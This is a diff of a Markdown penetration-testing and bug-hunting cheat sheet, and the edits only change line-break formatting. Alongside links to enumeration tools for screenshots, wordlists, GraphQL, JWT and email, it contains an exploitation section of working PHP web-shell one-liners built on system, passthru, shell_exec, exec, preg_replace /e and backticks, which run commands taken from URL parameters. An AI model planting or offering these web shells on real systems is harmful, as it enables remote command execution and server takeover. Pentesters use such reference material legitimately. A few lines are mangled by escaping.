@@ -5,15 +5,15 @@ https://github.com/Elsfa7-110/Elsfa7110-Oneliner-bughunting
 # Enumeration
 
 ## Screenshot enumeration
-https://github.com/byt3bl33d3r/WitnessMe\
-https://github.com/sensepost/gowitness
+https://github.com/byt3bl33d3r/WitnessMe  
+https://github.com/sensepost/gowitness  
 
  
 ## Wordlists
 
-https://wordlists.assetnote.io \
-https://github.com/danielmiessler/SecLists \
-https://github.com/xajkep/wordlists 
+https://wordlists.assetnote.io  
+https://github.com/danielmiessler/SecLists  
+https://github.com/xajkep/wordlists  
 
 ## GraphQL
 
@@ -21,11 +21,11 @@ https://github.com/dolevf/graphw00f
 
 ## JWT
 
-https://github.com/ticarpi/jwt_tool\
-https://jwt.io/\
-https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities
+https://github.com/ticarpi/jwt_tool  
+https://jwt.io/  
+https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities  
 
-
+  
 # Email enumeration
 ## SimplyEmail
 ```
@@ -43,33 +43,33 @@ https://github.com/gremwell/o365enum
 # Exploitation
 
 ## Webshells
-PHP \
+PHP   
 `<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
-Execute one command\
+Execute one command  
 `<?php system("whoami"); ?>`
 
-Take input from the url paramter. shell.php?cmd=whoami\
+Take input from the url paramter. shell.php?cmd=whoami  
 `<?php system($_GET['cmd']); ?>`
 
-The same but using passthru\
+The same but using passthru  
 `<?php passthru($_GET['cmd']); ?>`
 
-For shell_exec to output the result you need to echo it\
+For shell_exec to output the result you need to echo it  
 `<?php echo shell_exec("whoami");?>`
 
-Exec() does not output the result without echo, and only output the last line. So not very useful!\
+Exec() does not output the result without echo, and only output the last line. So not very useful!  
 `<?php echo exec("whoami");?>`
 
-Instead to this if you can. It will return the output as an array, and then print it all.\
+Instead to this if you can. It will return the output as an array, and then print it all.  
 `<?php exec("ls -la",$array); print_r($array); ?>`
 
-preg_replace(). This is a cool trick\
+preg_replace(). This is a cool trick  
 `<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>`
 
-Using backticks\
+Using backticks  
 `<?php $output =\'whoami\`; echo "\<pre>$output\</pre>"; ?>`
 
-Using backticks\
+Using backticks  
 `<?php echo ```whoami```; ?>`
 
 https://github.com/d4rkiZ/ProcOpen-PHP-Webshell
